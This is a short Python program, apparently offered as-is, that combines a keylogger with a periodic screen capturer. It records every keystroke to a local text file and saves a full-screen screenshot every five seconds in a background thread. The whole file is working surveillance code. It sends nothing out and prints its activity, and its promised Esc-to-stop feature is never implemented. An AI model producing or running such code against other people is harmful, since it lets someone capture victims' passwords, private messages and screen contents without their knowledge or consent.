from pynput import keyboard
from datetime import datetime
import time
import pyautogui
import threading

class KeyloggerAndScreenshot:
    def __init__(self) -> None:
        self.keylogger = KeyLogger()
        self.screenshot_thread = None

    def start(self):
        try:
            self.screenshot_thread = threading.Thread(target=self.run_screenshot)
            self.screenshot_thread.daemon = True
            self.screenshot_thread.start()

            self.keylogger.start()
        except KeyboardInterrupt:
            print("\nProgram interrupted by user.")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            self.stop()

    def stop(self):
        self.keylogger.stop()
        if self.screenshot_thread:
            self.screenshot_thread.join()

    def run_screenshot(self):
        try:
            while True:
                current_time = datetime.now().strftime("%d•%m•%G–%H:%M:%S.png")
                image = pyautogui.screenshot()
                image.save(current_time)
                print(f"Screenshot saved: {current_time}")

                # Wait for 5 seconds before the next capture
                time.sleep(5)

        except KeyboardInterrupt:
            print("Screenshot thread interrupted by user.")
        except Exception as e:
            print(f"An error occurred in screenshot thread: {e}")

class KeyLogger:
    def __init__(self) -> None:
        self.listener = None

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        with open("keylogs.txt", 'a') as logs:
            logs.write(char)
        print(f"Key pressed: {char}")

    def start(self):
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            print("Keylogger started. Press 'Esc' to stop.")
            self.listener.join()
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            self.stop()

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener.join()
            print("Keylogger stopped.")

if __name__ == '__main__':
    combined_program = KeyloggerAndScreenshot()
    combined_program.start()
